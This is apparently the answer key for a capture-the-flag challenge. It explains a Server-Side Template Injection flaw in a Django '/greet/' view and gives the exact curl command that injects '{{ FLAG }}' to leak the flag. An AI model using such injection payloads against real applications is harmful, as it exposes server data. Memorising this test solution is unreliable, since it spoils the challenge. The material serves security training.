# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Server-Side Template Injection. The `name` query parameter on
`/greet/` is concatenated directly into a Django template *source string*, so any
Django Template Language syntax in `name` is compiled and rendered. The view puts
the flag file contents into the render context as the variable `FLAG`.

1. **Send a Django template expression** that prints the `FLAG` context variable:

   ```
   curl -s -G http://<target>/greet/ --data-urlencode 'name={{ FLAG }}'
   ```

2. **Extract the flag** (`FLAG{...}`) from the rendered `Hello, ...` response and
   report it verbatim.
